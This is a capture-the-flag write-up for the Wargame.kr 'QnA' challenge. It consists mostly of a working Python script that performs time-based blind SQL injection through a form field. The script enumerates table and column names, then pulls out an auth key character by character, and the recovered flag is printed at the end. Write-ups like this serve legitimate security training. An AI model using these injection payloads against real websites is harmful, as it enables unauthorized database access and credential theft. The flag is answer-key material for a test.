# [Wargame.kr] QnA - Writeup

## Time Based Blind SQL Injection

``` python
import urllib.parse, urllib.request
import time


def inject(query):
	url = 'http://wargame.kr:8080/qna/?page=to_jsmaster'
	post_data = {
		'cont':'foo',
		'mail':'bar',
		'type':query
	}
	headers = {
		'Content-Type':'application/x-www-form-urlencoded'
	}
	t = time.time()
	req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode('utf-8'), headers)
	res = urllib.request.urlopen(req).read().decode()
	return 'send success' in res and time.time() - t > 5

def get_table_list():
	data = ''
	for i in range(1, 100):
		for c in range(32, 128):
			if inject("0 || sleep(if((select mid(reverse(group_concat(table_name)), %d, 1) from information_schema.tables)=%s, 5, 0)) || 0" % (i, hex(c))):
				data += chr(c)
				print('data:', data[::-1])
				break
	# table : authkey

def get_column_list():
	data = ''
	for i in range(1, 100):
		for c in range(32, 128):
			if inject("0 || sleep(if((select mid(group_concat(column_name), %d, 1) from information_schema.columns where table_name=0x617574686B6579)=%s, 5, 0)) || 0" % (i, hex(c))):
				data += chr(c)
				print('data:', data)
				break
	# column : authkey

def get_authkey():
	data = ''
	for i in range(1, 100):
		for c in range(32, 128):
			if inject("0 || sleep(if((select mid(authkey, %d, 1) from authkey)=%s, 5, 0)) || 0" % (i, hex(c))):
				data += chr(c)
				print('data:', data)
				break

def main():
	get_authkey()
				
if __name__ == '__main__':
	main()
```
```
data: 932089279DCD461AE1305E44598333B1DB1FE3EF
```

___

## Answer

flag: `932089279DCD461AE1305E44598333B1DB1FE3EF`